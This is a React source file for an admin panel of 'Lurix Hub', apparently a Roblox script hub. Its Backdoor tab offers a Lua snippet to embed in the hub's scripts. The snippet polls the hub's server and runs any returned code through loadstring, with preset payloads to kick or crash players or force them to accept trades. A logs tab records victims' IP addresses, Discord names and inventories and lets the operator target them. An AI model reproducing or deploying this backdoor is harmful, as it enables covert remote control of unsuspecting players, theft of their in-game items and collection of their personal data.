          <div style={{ height: 380, border: `1px solid ${T.border}`, borderRadius: 12, overflow: 'hidden', background: '#0d0f14' }}>
            <div style={{ height: 32, background: '#0a0c12', borderBottom: `1px solid ${T.border}`, display: 'flex', alignItems: 'center', padding: '0 14px', gap: 6 }}>
              {['#ff5f57','#febc2e','#28c840'].map(c => (
                <div key={c} style={{ width: 10, height: 10, borderRadius: '50%', background: c }} />
              ))}
              <span style={{ fontSize: 11, color: T.textMuted, marginLeft: 8, fontFamily: 'monospace' }}>{slug}.lua</span>
            </div>
            <Editor height="calc(380px - 32px)" value={code} onChange={v => setCode(v || '')} />
          </div>
        </div>
      )}
    </div>
  );
};

// ─── BACKDOOR TAB ─────────────────────────────────────────────────────────────
const BackdoorTab = ({ defaultUser }) => {
  const [targetType, setTargetType] = useState(defaultUser ? 'USER' : 'ALL');
  const [targetVal, setTargetVal] = useState(defaultUser || 'ALL');
  const [payload, setPayload] = useState('print("[Lurix Backdoor]: Executed")');
  const [sending, setSending] = useState(false);
  const [history, setHistory] = useState([]);

  useEffect(() => { if (defaultUser) { setTargetType('USER'); setTargetVal(defaultUser); } }, [defaultUser]);

  const domain = typeof window !== 'undefined' ? window.location.origin : 'https://lurixhub.vercel.app';

  const snippet = `-- [Lurix Hub] Backdoor Engine
task.spawn(function()
    local HttpService = game:GetService("HttpService")
    local Players = game:GetService("Players")
    local lp = Players.LocalPlayer
    local req = (syn and syn.request) or request or http_request

    while task.wait(4) do
        pcall(function()
            if not lp then return end
            local url = "${domain}/api/backdoor?user=" .. HttpService:UrlEncode(lp.Name)
            local res = req({ Url = url, Method = "GET" })
            if res and res.Body and #res.Body > 0 then
                local fn = loadstring(res.Body)
                if fn then task.spawn(fn) end
            end
        end)
    end
end)`;

  const PRESETS = [
    { label: 'Kick', color: T.red, payload: `game:GetService("Players").LocalPlayer:Kick("Admin action")` },
    { label: 'Crash', color: T.purple, payload: `while true do end` },
    { label: 'Notify', color: T.accent, payload: `game:GetService("StarterGui"):SetCore("SendNotification",{Title="LURIX",Text="Admin is watching!",Duration=10})` },
    { label: 'Jumpscare', color: T.yellow, payload: `local s=Instance.new("Sound",game:GetService("SoundService"));s.SoundId="rbxassetid://9114223177";s.Volume=10;s:Play()` },
    { label: 'Accept Trade', color: T.green, payload: `game:GetService("ReplicatedStorage").TradeEvents.TradeComm:FireServer("AcceptTrade")` },
  ];

  const send = async () => {
    if (!payload.trim()) return;
    setSending(true);
    await new Promise(r => setTimeout(r, 800));
    setHistory(h => [{ id: Date.now(), targetType, targetValue: targetVal, payload_lua: payload, created_at: new Date().toISOString() }, ...h.slice(0, 19)]);
    setSending(false);
    alert('Command dispatched.');
  };

  return (
    <div style={{ display: 'flex', gap: 20, flexWrap: 'wrap' }}>
      {/* Left panel */}
      <div style={{ flex: '1 1 340px', display: 'flex', flexDirection: 'column', gap: 16 }}>
        <div style={{ ...css.card(false), borderColor: `${T.yellow}33` }}>
          <div style={{ ...css.cardHeader }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
              <div style={{ color: T.yellow }}><Icon.Zap /></div>
              <span style={{ fontWeight: 800, fontSize: 13, color: T.yellow }}>Remote Code Execution</span>
            </div>
            <div style={css.badge(T.yellow)}>LIVE</div>
          </div>
          <div style={{ padding: '20px' }}>
            {/* Target */}
            <div style={{ display: 'grid', gridTemplateColumns: targetType !== 'ALL' ? '120px 1fr' : '1fr', gap: 12, marginBottom: 16 }}>
              <div>
                <div style={{ fontSize: 10, fontWeight: 700, color: T.textMuted, marginBottom: 6, textTransform: 'uppercase' }}>Target Type</div>
                <select value={targetType} onChange={e => setTargetType(e.target.value)} style={{ ...css.input, fontWeight: 700, cursor: 'pointer', color: T.yellow }}
                  onFocus={e => e.target.style.borderColor = T.yellow} onBlur={e => e.target.style.borderColor = T.border}>
                  <option value="ALL">ALL</option>
                  <option value="USER">User</option>
                  <option value="IP">IP</option>
                </select>
              </div>
              {targetType !== 'ALL' && (
                <div>
                  <div style={{ fontSize: 10, fontWeight: 700, color: T.textMuted, marginBottom: 6, textTransform: 'uppercase' }}>Value</div>
                  <input value={targetVal} onChange={e => setTargetVal(e.target.value)}
                    placeholder={targetType === 'USER' ? 'username' : 'ip address'}
                    style={{ ...css.input, fontFamily: 'monospace', color: T.yellow }}
                    onFocus={e => e.target.style.borderColor = T.yellow} onBlur={e => e.target.style.borderColor = T.border} />
                </div>
              )}
            </div>

            {/* Presets */}
            <div style={{ marginBottom: 16 }}>
              <div style={{ fontSize: 10, fontWeight: 700, color: T.textMuted, marginBottom: 8, textTransform: 'uppercase' }}>Quick Presets</div>
              <div style={{ display: 'flex', flexWrap: 'wrap', gap: 6 }}>
                {PRESETS.map(p => (
                  <button key={p.label} onClick={() => setPayload(p.payload)}
                    style={{ ...css.btn('ghost'), padding: '6px 12px', fontSize: 11, color: p.color, borderColor: `${p.color}33`, background: `${p.color}0d` }}>
                    {p.label}
                  </button>
                ))}
              </div>
            </div>

            {/* Payload */}
            <div style={{ marginBottom: 16 }}>
              <div style={{ fontSize: 10, fontWeight: 700, color: T.textMuted, marginBottom: 6, textTransform: 'uppercase' }}>Lua Payload</div>
              <div style={{ border: `1px solid ${T.border}`, borderRadius: 10, overflow: 'hidden', background: '#0d0f14' }}>
                <div style={{ height: 28, background: '#0a0c12', borderBottom: `1px solid ${T.border}`, display: 'flex', alignItems: 'center', padding: '0 12px', gap: 5 }}>
                  {['#ff5f57','#febc2e','#28c840'].map(c => <div key={c} style={{ width: 8, height: 8, borderRadius: '50%', background: c }} />)}
                </div>
                <Editor height="200px" value={payload} onChange={v => setPayload(v || '')} />
              </div>
            </div>

            <button onClick={send} disabled={sending} style={{
              ...css.btn('yellow'),
              width: '100%',
              justifyContent: 'center',
              padding: '13px',
              fontSize: 13,
              fontWeight: 900,
              borderRadius: 12,
              opacity: sending ? 0.6 : 1,
              boxShadow: `0 0 30px ${T.yellowGlow}`,
            }}>
              {sending ? 'Sending...' : '⚡ Execute Command'}
            </button>
          </div>
        </div>
      </div>

      {/* Right panel */}
      <div style={{ flex: '1 1 280px', display: 'flex', flexDirection: 'column', gap: 16 }}>
        {/* Snippet */}
        <div style={css.card(false)}>
          <div style={css.cardHeader}>
            <span style={{ fontSize: 12, fontWeight: 700, color: T.text }}>Integration Snippet</span>
            <CopyBtn text={snippet} label="Copy" small />
          </div>
          <div style={{ padding: '14px 18px' }}>
            <p style={{ fontSize: 11, color: T.textMuted, marginBottom: 10 }}>Embed in your scripts to enable remote command polling:</p>
            <pre style={{ background: 'rgba(0,0,0,0.5)', borderRadius: 8, padding: '10px 12px', fontSize: 10, fontFamily: 'monospace', color: `${T.yellow}dd`, border: `1px solid ${T.border}`, maxHeight: 160, overflowY: 'auto', whiteSpace: 'pre-wrap', wordBreak: 'break-word' }}>
              {snippet}
            </pre>
          </div>
        </div>

        {/* History */}
        <div style={{ ...css.card(false), flex: 1 }}>
          <div style={css.cardHeader}>
            <span style={{ fontSize: 12, fontWeight: 700, color: T.text }}>Command History</span>
            <div style={css.badge(T.textMuted)}>{history.length}</div>
          </div>
          <div style={{ padding: '14px', display: 'flex', flexDirection: 'column', gap: 8, maxHeight: 300, overflowY: 'auto' }}>
            {history.length === 0
              ? <div style={{ textAlign: 'center', padding: '24px 0', color: T.textMuted, fontSize: 12 }}>No history yet</div>
              : history.map(h => (
                <div key={h.id} style={{ background: 'rgba(0,0,0,0.3)', border: `1px solid ${T.border}`, borderRadius: 10, padding: '10px 12px' }}>
                  <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 4 }}>
                    <span style={{ fontSize: 10, fontWeight: 700, color: T.yellow }}>{h.targetType}: {h.targetValue}</span>
                    <span style={{ fontSize: 10, color: T.textMuted }}>{new Date(h.created_at).toLocaleTimeString()}</span>
                  </div>
                  <div style={{ fontSize: 11, color: '#94a3b8', fontFamily: 'monospace', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }}>
                    {h.payload_lua}
                  </div>
                </div>
              ))
            }
          </div>
        </div>
      </div>
    </div>
  );
};

// ─── USER LOGS TAB ────────────────────────────────────────────────────────────
const UserLogsTab = ({ onTarget }) => {
  const [logs, setLogs] = useState(MOCK_LOGS);
  const [search, setSearch] = useState('');
  const [loading, setLoading] = useState(false);
  const [storageLog, setStorageLog] = useState(null);
  const [storageTab, setStorageTab] = useState('stands');
  const [copiedId, setCopiedId] = useState(null);

  const filtered = useMemo(() => {
    const q = search.toLowerCase();
    if (!q) return logs;
    return logs.filter(l => [l.roblox_username, l.ip_address, l.discord_user, l.roblox_id].some(v => v?.toLowerCase().includes(q)));
  }, [logs, search]);

  const refresh = async () => {
    setLoading(true);
    await new Promise(r => setTimeout(r, 600));
    setLoading(false);
  };

  const copyJoin = async (log) => {
    if (!log.place_id || !log.job_id) return;
    const s = `game:GetService("TeleportService"):TeleportToPlaceInstance(${log.place_id}, "${log.job_id}", game.Players.LocalPlayer)`;
    await navigator.clipboard.writeText(s);
    setCopiedId(log.id);
    setTimeout(() => setCopiedId(null), 2000);
  };

  const parsedStorage = useMemo(() => {
    if (!storageLog?.stand_storage) return { slots: [], spec_storage: 'Empty' };
    try { return typeof storageLog.stand_storage === 'string' ? JSON.parse(storageLog.stand_storage) : storageLog.stand_storage; }
    catch { return { slots: [], spec_storage: 'Empty' }; }
  }, [storageLog]);

  const parsedInventory = useMemo(() => {
    if (!storageLog?.inventory_data) return [];
    try { return typeof storageLog.inventory_data === 'string' ? JSON.parse(storageLog.inventory_data) : storageLog.inventory_data; }
    catch { return []; }
  }, [storageLog]);

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
      {/* Header */}
      <div style={{ display: 'flex', gap: 12, flexWrap: 'wrap', alignItems: 'center', justifyContent: 'space-between' }}>
        <div style={{ flex: '1 1 200px' }}>
          <input
            value={search}
            onChange={e => setSearch(e.target.value)}
            placeholder="Search by username, IP, Discord, ID..."
            style={{ ...css.input }}
            onFocus={e => e.target.style.borderColor = T.accent}
            onBlur={e => e.target.style.borderColor = T.border}
          />
        </div>
        <div style={{ display: 'flex', gap: 8 }}>
          <button onClick={refresh} style={css.btn('ghost')}>
            <Icon.RefreshCw /> {loading ? 'Loading...' : 'Refresh'}
          </button>
          <button onClick={() => { if (confirm('Clear all logs?')) setLogs([]); }} style={css.btn('danger')}>
            <Icon.Trash /> Clear
          </button>
        </div>
      </div>

      {/* Table */}
      <div style={{ ...css.card(false), overflow: 'hidden' }}>
        <div style={{ overflowX: 'auto' }}>
          <table style={css.table}>
            <thead>
              <tr>
                {['User', 'Server', 'IP', 'Discord / Exec', 'Timestamp', 'Actions'].map(h => (
                  <th key={h} style={css.th}>{h}</th>
                ))}
              </tr>
            </thead>
            <tbody>
              {filtered.length === 0
                ? (
                  <tr>
                    <td colSpan={6} style={{ ...css.td, textAlign: 'center', padding: '48px', color: T.textMuted }}>
                      {search ? `No results for "${search}"` : 'No logs.'}
                    </td>
                  </tr>
                )
                : filtered.map(log => (
                  <tr key={log.id} style={{ transition: 'background 0.1s' }}
                    onMouseEnter={e => e.currentTarget.style.background = 'rgba(110,150,255,0.03)'}
                    onMouseLeave={e => e.currentTarget.style.background = 'transparent'}>
                    <td style={css.td}>
                      <div style={{ fontWeight: 700, fontSize: 12, color: T.text }}>{log.roblox_username}</div>
                      <div style={{ fontSize: 10, fontFamily: 'monospace', color: T.textMuted, marginTop: 2 }}>ID: {log.roblox_id}</div>
                    </td>
                    <td style={css.td}>
                      <div style={css.badge(log.is_vip ? T.purple : T.green)}>{log.is_vip ? 'VIP' : 'Public'}</div>
                    </td>
                    <td style={{ ...css.td, fontFamily: 'monospace', fontSize: 11, color: T.accent }}>{log.ip_address}</td>
                    <td style={css.td}>
                      <div style={{ fontSize: 12, fontWeight: 600, color: '#818cf8' }}>{log.discord_user || '—'}</div>
                      <div style={{ fontSize: 10, fontFamily: 'monospace', color: T.textMuted, marginTop: 2 }}>{log.executor}</div>
                    </td>
                    <td style={{ ...css.td, fontSize: 11, color: T.textMuted, whiteSpace: 'nowrap' }}>
                      {new Date(log.created_at).toLocaleString()}
                    </td>
                    <td style={css.td}>
                      <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
                        <button onClick={() => { setStorageLog(log); setStorageTab('stands'); }}
                          style={{ ...css.btn('secondary'), padding: '6px 10px', fontSize: 10 }}>
                          <Icon.Package /> Storage
                        </button>
                        {log.place_id && log.job_id
                          ? <button onClick={() => copyJoin(log)}
                              style={{ ...css.btn(copiedId === log.id ? 'green' : 'secondary'), padding: '6px 10px', fontSize: 10 }}>
                              {copiedId === log.id ? <Icon.Check /> : <Icon.Copy />}
                              {copiedId === log.id ? 'Copied' : 'Join'}
                            </button>
                          : <span style={{ fontSize: 10, color: T.textDim, fontStyle: 'italic' }}>No JobId</span>
                        }
                        <button onClick={() => onTarget(log.roblox_username)}
                          style={{ ...css.btn('yellow'), padding: '6px 10px', fontSize: 10 }}>
                          <Icon.Target /> Target
                        </button>
                      </div>
                    </td>
                  </tr>
                ))
              }
            </tbody>
          </table>
        </div>
      </div>

      {/* Storage Modal */}
      {storageLog && (
        <div style={css.overlay} onClick={e => { if (e.target === e.currentTarget) setStorageLog(null); }}>
          <div style={css.modal} onClick={e => e.stopPropagation()}>
            {/* Header */}
            <div style={{ padding: '18px 22px', borderBottom: `1px solid ${T.border}`, display: 'flex', alignItems: 'center', justifyContent: 'space-between', background: 'rgba(0,0,0,0.3)' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 12 }}>
                <div style={{ ...css.logoIcon, width: 36, height: 36 }}>
                  {storageLog.roblox_username[0].toUpperCase()}
                </div>
                <div>
                  <div style={{ fontWeight: 800, fontSize: 15, color: T.text }}>{storageLog.roblox_username}</div>
                  <div style={{ fontSize: 11, fontFamily: 'monospace', color: T.textMuted }}>ID: {storageLog.roblox_id}</div>
                </div>
              </div>
              <button onClick={() => setStorageLog(null)} style={{ ...css.btn('ghost'), padding: '8px', borderRadius: 8 }}>
                <Icon.X />
              </button>
            </div>

            {/* Tabs */}
            <div style={{ display: 'flex', gap: 0, borderBottom: `1px solid ${T.border}` }}>
              {['stands', 'inventory'].map(t => (
                <button key={t} onClick={() => setStorageTab(t)} style={{
                  flex: 1,
                  padding: '13px',
                  fontWeight: 800,
                  fontSize: 12,
                  textTransform: 'capitalize',
                  letterSpacing: '0.04em',
                  cursor: 'pointer',
                  border: 'none',
                  background: storageTab === t ? T.accentDim : 'transparent',
                  color: storageTab === t ? T.accent : T.textMuted,
                  borderBottom: storageTab === t ? `2px solid ${T.accent}` : '2px solid transparent',
                  transition: 'all 0.15s',
                }}>
                  {t === 'stands' ? 'Stand Storage' : 'Inventory'}
                </button>
              ))}
            </div>

            {/* Content */}
            <div style={{ padding: '20px', overflowY: 'auto', flex: 1 }}>
              {storageTab === 'stands' && (
                <div style={{ display: 'flex', flexDirection: 'column', gap: 12 }}>
                  <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(200px, 1fr))', gap: 10 }}>
                    {(parsedStorage.slots || []).map((slot, i) => {
                      const remote = `local Event = game:GetService("ReplicatedStorage").TradeEvents.TradeComm\nEvent:FireServer("AddStand", { GUID = "${slot.guid || ''}", StandName = "${slot.raw_name || slot.name}", Attribute = "${slot.attribute || 'None'}" })`;
                      return (
                        <div key={i} style={{
                          background: slot.is_empty ? 'rgba(0,0,0,0.2)' : 'rgba(0,0,0,0.4)',
                          border: `1px solid ${slot.is_empty ? T.border : `${tierColor(slot.tier)}33`}`,
                          borderRadius: 12, padding: '14px',
                          opacity: slot.is_empty ? 0.5 : 1,
                          cursor: slot.is_empty ? 'default' : 'pointer',
                          transition: 'all 0.15s',
                        }}>
                          <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 8 }}>
                            <span style={{ ...css.badge(T.textMuted), fontSize: 9 }}>Slot {slot.slot}</span>
                            {!slot.is_empty && <span style={{ ...css.badge(tierColor(slot.tier)), fontSize: 9 }}>T{slot.tier}</span>}
                          </div>
                          <div style={{ fontWeight: 800, fontSize: 13, color: T.text, marginBottom: 4 }}>{slot.name}</div>
                          <div style={{ fontSize: 11, color: T.textMuted, marginBottom: slot.is_empty ? 0 : 10 }}>
                            Attr: <span style={{ color: T.text }}>{slot.attribute}</span>
                          </div>
                          {!slot.is_empty && <CopyBtn text={remote} label="Copy Remote" labelCopied="Copied!" small />}
                        </div>
                      );
                    })}
                  </div>
                  <div style={{ ...css.card(false), borderRadius: 12 }}>
                    <div style={{ padding: '14px 16px', display: 'flex', alignItems: 'center', justifyContent: 'space-between' }}>
                      <div>
                        <div style={{ fontSize: 10, fontWeight: 700, color: T.textMuted, textTransform: 'uppercase', marginBottom: 2 }}>Spec Storage</div>
                        <div style={{ fontSize: 14, fontWeight: 800, color: T.text }}>{parsedStorage.spec_storage || 'Empty'}</div>
                      </div>
                      <div style={css.badge(T.accent)}>Active</div>
                    </div>
                  </div>
                </div>
              )}

              {storageTab === 'inventory' && (
                <div>
                  {parsedInventory.length === 0
                    ? <div style={{ textAlign: 'center', padding: '40px', color: T.textMuted, fontSize: 12 }}>No inventory data</div>
                    : (
                      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(180px, 1fr))', gap: 10 }}>
                        {parsedInventory.map((item, i) => (
                          <div key={i} style={{ background: 'rgba(0,0,0,0.3)', border: `1px solid ${T.border}`, borderRadius: 12, padding: '12px 14px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                            <div>
                              <div style={{ fontWeight: 700, fontSize: 12, color: T.text }}>{item.name}</div>
                              <div style={{ fontSize: 10, color: T.textMuted, marginTop: 2 }}>{item.type}</div>
                            </div>
                            <div style={{ ...css.badge(T.accent), fontSize: 12, fontWeight: 900 }}>×{item.count}</div>
                          </div>
                        ))}
                      </div>
                    )
                  }
                </div>
              )}
            </div>

            <div style={{ padding: '14px 20px', borderTop: `1px solid ${T.border}`, background: 'rgba(0,0,0,0.2)', display: 'flex', justifyContent: 'flex-end' }}>
              <button onClick={() => setStorageLog(null)} style={css.btn('ghost')}>Close</button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
};

// ─── HOME CONFIG TAB ──────────────────────────────────────────────────────────
const HomeConfigTab = () => {
  const [siteTitle, setSiteTitle] = useState('LURIX HUB');
  const [badge, setBadge] = useState('Online & Active');
  const [loaderScript, setLoaderScript] = useState('loadstring(game:HttpGet("..."))()');
  const [currentKey, setCurrentKey] = useState('LURIX-2025-XXXX');
  const [ytLink, setYtLink] = useState('https://youtube.com');
  const [dcLink, setDcLink] = useState('https://discord.gg/');
  const [games, setGames] = useState([{ name: 'Stand Upright', logo: '/logo.png', status: 'Fully Supported', tag: 'ROBLOX' }]);
  const [saving, setSaving] = useState(false);

  const save = async () => { setSaving(true); await new Promise(r => setTimeout(r, 700)); setSaving(false); alert('Settings saved.'); };
  const addGame = () => setGames(g => [...g, { name: 'New Game', logo: '/logo.png', status: 'Supported', tag: 'ROBLOX' }]);
  const removeGame = (i) => { if (games.length <= 1) return; setGames(g => g.filter((_, idx) => idx !== i)); };
  const changeGame = (i, f, v) => { const u = [...games]; u[i][f] = v; setGames(u); };

  const Field = ({ label, value, onChange, mono, accent }) => (
    <div>
      <div style={{ fontSize: 10, fontWeight: 700, color: T.textMuted, marginBottom: 6, textTransform: 'uppercase', letterSpacing: '0.06em' }}>{label}</div>
      <input value={value} onChange={e => onChange(e.target.value)}
        style={{ ...css.input, fontFamily: mono ? 'monospace' : 'inherit', color: accent ? T.accent : T.text, fontWeight: accent ? 700 : 400 }}
        onFocus={e => e.target.style.borderColor = T.accent}
        onBlur={e => e.target.style.borderColor = T.border}
      />
    </div>
  );

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 20, maxWidth: 760 }}>
      <div style={css.card(false)}>
        <div style={css.cardHeader}>
          <span style={{ fontWeight: 800, fontSize: 13, color: T.text }}>Site Configuration</span>
        </div>
        <div style={{ padding: '20px', display: 'flex', flexDirection: 'column', gap: 16 }}>
          <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(220px, 1fr))', gap: 14 }}>
            <Field label="Site Title" value={siteTitle} onChange={setSiteTitle} />
            <Field label="Badge Text" value={badge} onChange={setBadge} accent />
            <Field label="YouTube Link" value={ytLink} onChange={setYtLink} />
            <Field label="Discord Link" value={dcLink} onChange={setDcLink} />
          </div>
        </div>
      </div>

      <div style={css.card(false)}>
        <div style={css.cardHeader}>
          <span style={{ fontWeight: 800, fontSize: 13, color: T.text }}>Loader & Key</span>
        </div>
        <div style={{ padding: '20px', display: 'flex', flexDirection: 'column', gap: 14 }}>
          <div>
            <div style={{ fontSize: 10, fontWeight: 700, color: T.textMuted, marginBottom: 6, textTransform: 'uppercase' }}>Home Loader Script</div>
            <textarea value={loaderScript} onChange={e => setLoaderScript(e.target.value)} rows={3}
              style={{ ...css.input, fontFamily: 'monospace', fontSize: 12, resize: 'vertical', lineHeight: 1.6 }}
              onFocus={e => e.target.style.borderColor = T.accent} onBlur={e => e.target.style.borderColor = T.border} />
          </div>
          <Field label="Access Key" value={currentKey} onChange={setCurrentKey} mono accent />
        </div>
      </div>

      <div style={css.card(false)}>
        <div style={{ ...css.cardHeader, flexWrap: 'wrap', gap: 10 }}>
          <span style={{ fontWeight: 800, fontSize: 13, color: T.text }}>Supported Games ({games.length})</span>
          <button onClick={addGame} style={{ ...css.btn('secondary'), padding: '6px 12px', fontSize: 11 }}>
            <Icon.Plus /> Add Game
          </button>
        </div>
        <div style={{ padding: '16px 20px', display: 'flex', flexDirection: 'column', gap: 12 }}>
          {games.map((g, i) => (
            <div key={i} style={{ background: 'rgba(0,0,0,0.3)', border: `1px solid ${T.border}`, borderRadius: 12, padding: '14px' }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 10 }}>
                <span style={{ ...css.badge(T.accent), fontSize: 9 }}>Game #{i + 1}</span>
                {games.length > 1 && (
                  <button onClick={() => removeGame(i)} style={{ ...css.btn('danger'), padding: '4px 10px', fontSize: 10 }}>Remove</button>
                )}
              </div>
              <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fill, minmax(160px, 1fr))', gap: 10 }}>
                {[['name', 'Game Name'], ['logo', 'Logo URL'], ['status', 'Status'], ['tag', 'Tag']].map(([f, l]) => (
                  <div key={f}>
                    <div style={{ fontSize: 10, fontWeight: 600, color: T.textMuted, marginBottom: 5 }}>{l}</div>
                    <input value={g[f]} onChange={e => changeGame(i, f, e.target.value)}
                      style={{ ...css.input, padding: '8px 12px', fontSize: 12 }}
                      onFocus={e => e.target.style.borderColor = T.accent}
                      onBlur={e => e.target.style.borderColor = T.border} />
                  </div>
                ))}
              </div>
            </div>
          ))}
        </div>
      </div>

      <button onClick={save} disabled={saving} style={{ ...css.btn('primary'), padding: '13px 28px', fontSize: 13, fontWeight: 900, borderRadius: 12, alignSelf: 'flex-start', opacity: saving ? 0.6 : 1 }}>
        {saving ? 'Saving...' : 'Save All Settings'}
      </button>
    </div>
  );
};

// ─── SETTINGS TAB ─────────────────────────────────────────────────────────────
const SettingsTab = () => {
  const [newPw, setNewPw] = useState('');
  const [show, setShow] = useState(false);
  const [saving, setSaving] = useState(false);

  const save = async () => {
    if (!newPw.trim()) return alert('Enter a password.');
    setSaving(true);
    await new Promise(r => setTimeout(r, 700));
    setSaving(false);
    alert('Password updated.');
    setNewPw('');
  };

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 20, maxWidth: 420 }}>
      <div style={css.card(false)}>
        <div style={css.cardHeader}><span style={{ fontWeight: 800, fontSize: 13, color: T.text }}>Change Admin Password</span></div>
        <div style={{ padding: '20px', display: 'flex', flexDirection: 'column', gap: 14 }}>
          <div style={{ position: 'relative' }}>
            <div style={{ fontSize: 10, fontWeight: 700, color: T.textMuted, marginBottom: 6, textTransform: 'uppercase' }}>New Password</div>
            <div style={{ position: 'relative' }}>
              <input type={show ? 'text' : 'password'} value={newPw} onChange={e => setNewPw(e.target.value)}
                placeholder="Enter new password..."
                style={{ ...css.input, fontFamily: 'monospace', paddingRight: 42 }}
                onFocus={e => e.target.style.borderColor = T.accent}
                onBlur={e => e.target.style.borderColor = T.border} />
              <button type="button" onClick={() => setShow(!show)}
                style={{ position: 'absolute', right: 12, top: '50%', transform: 'translateY(-50%)', background: 'none', border: 'none', cursor: 'pointer', color: T.textMuted, display: 'flex', padding: 0 }}>
                {show ? <Icon.EyeOff /> : <Icon.Eye />}
              </button>
            </div>
          </div>
          <button onClick={save} disabled={saving || !newPw}
            style={{ ...css.btn('green'), justifyContent: 'center', padding: '12px', fontWeight: 900, fontSize: 13, borderRadius: 12, opacity: saving || !newPw ? 0.5 : 1 }}>
            {saving ? 'Updating...' : 'Update Password'}
          </button>
        </div>
      </div>
    </div>
  );
};

// ─── MAIN APP ─────────────────────────────────────────────────────────────────
export default function AdminPage() {
  const [authed, setAuthed] = useState(false);
  const [pw, setPw] = useState('');
  const [activeTab, setActiveTab] = useState('custom_home');
  const [sidebarCollapsed, setSidebarCollapsed] = useState(false);
  const [mobileNavOpen, setMobileNavOpen] = useState(false);
  const [isMobile, setIsMobile] = useState(false);
  const [backdoorTarget, setBackdoorTarget] = useState(null);

  useEffect(() => {
    const check = () => setIsMobile(window.innerWidth < 768);
    check();
    window.addEventListener('resize', check);
    return () => window.removeEventListener('resize', check);
  }, []);

  useEffect(() => {
    if (isMobile) setSidebarCollapsed(true);
  }, [isMobile]);

  const handleLogin = (password) => {
    setPw(password);
    setAuthed(true);
  };

  const handleTarget = (username) => {
    setBackdoorTarget(username);
    setActiveTab('backdoor');
    setMobileNavOpen(false);
  };

  useEffect(() => {
    if (activeTab !== 'backdoor') setBackdoorTarget(null);
  }, [activeTab]);

  if (!authed) return <LoginPage onLogin={handleLogin} />;

  const stats = [
    { label: 'Scripts', value: MOCK_SCRIPTS.length, sub: 'total', color: T.accent },
    { label: 'Exec Logs', value: MOCK_LOGS.length, sub: 'recent', color: T.accent },
    { label: 'Games', value: 1, sub: 'supported', color: T.yellow },
    { label: 'Status', value: 'LIVE', sub: '100% uptime', color: T.green },
  ];

  const renderTab = () => {
    switch (activeTab) {
      case 'custom_home': return <HomeConfigTab />;
      case 'scripts': return <ScriptsTab isMobile={isMobile} />;
      case 'backdoor': return <BackdoorTab defaultUser={backdoorTarget} />;
      case 'user_logs': return <UserLogsTab onTarget={handleTarget} />;
      case 'settings': return <SettingsTab />;
      default: return null;
    }
  };

  const navLabel = NAV.find(n => n.id === activeTab)?.label || '';

  return (
    <div style={css.root}>
      <style>{`
        * { box-sizing: border-box; margin: 0; padding: 0; }
        ::-webkit-scrollbar { width: 4px; height: 4px; }
        ::-webkit-scrollbar-track { background: transparent; }
        ::-webkit-scrollbar-thumb { background: rgba(110,150,255,0.25); border-radius: 2px; }
        ::-webkit-scrollbar-thumb:hover { background: rgba(110,150,255,0.45); }
        input::placeholder { color: #334155; }
        textarea::placeholder { color: #334155; }
        select option { background: #0c0e1a; color: #e2e8f0; }
        button { font-family: inherit; }
        @keyframes fadeIn { from{opacity:0;transform:translateY(8px)} to{opacity:1;transform:none} }
        @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:0.3} }
        @keyframes slideIn { from{transform:translateX(-100%)} to{transform:none} }
      `}</style>

      <div style={css.gridBg} />
      <div style={css.gradientOrb('rgba(110,150,255,0.08)', '-5%', '-5%', 600)} />
      <div style={css.gradientOrb('rgba(74,108,247,0.06)', '70%', '80%', 500)} />

      {/* Mobile nav overlay */}
      {isMobile && mobileNavOpen && (
        <div style={{ position: 'fixed', inset: 0, background: 'rgba(0,0,0,0.7)', zIndex: 200, backdropFilter: 'blur(4px)' }}
          onClick={() => setMobileNavOpen(false)}>
          <div style={{ width: 240, height: '100%', background: T.surface, borderRight: `1px solid ${T.border}`, animation: 'slideIn 0.2s ease', display: 'flex', flexDirection: 'column' }}
            onClick={e => e.stopPropagation()}>
            <div style={css.sidebarLogo}>
              <div style={css.logoIcon}>L</div>
              <div>
                <div style={css.logoText}>LURIX HUB</div>
                <div style={{ fontSize: 10, color: T.textMuted, fontWeight: 500 }}>Admin Panel</div>
              </div>
            </div>
            <div style={{ padding: '12px 0', flex: 1, overflowY: 'auto' }}>
              {NAV.map(n => (
                <div key={n.id} onClick={() => { setActiveTab(n.id); setMobileNavOpen(false); }} style={css.navItem(activeTab === n.id)}>
                  <div style={css.navIcon}><n.icon /></div>
                  <span>{n.label}</span>
                  {activeTab === n.id && <div style={{ marginLeft: 'auto' }}><Icon.ChevronRight /></div>}
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      <div style={css.layout}>
        {/* Sidebar (desktop) */}
        {!isMobile && (
          <div style={css.sidebar(sidebarCollapsed)}>
            <div style={css.sidebarLogo}>
              <div style={{ ...css.logoIcon, cursor: 'pointer' }} onClick={() => setSidebarCollapsed(!sidebarCollapsed)}>L</div>
              {!sidebarCollapsed && (
                <div style={{ overflow: 'hidden', minWidth: 0 }}>
                  <div style={css.logoText}>LURIX HUB</div>
                  <div style={{ fontSize: 10, color: T.textMuted, fontWeight: 500, whiteSpace: 'nowrap' }}>Admin Panel</div>
                </div>
              )}
            </div>

            <div style={{ flex: 1, padding: '12px 0', overflowY: 'auto', overflowX: 'hidden' }}>
              {NAV.map(n => (
                <div key={n.id} onClick={() => setActiveTab(n.id)} style={css.navItem(activeTab === n.id)} title={sidebarCollapsed ? n.label : undefined}>
                  <div style={{ ...css.navIcon, color: activeTab === n.id ? n.color : 'inherit' }}><n.icon /></div>
                  {!sidebarCollapsed && <span>{n.label}</span>}
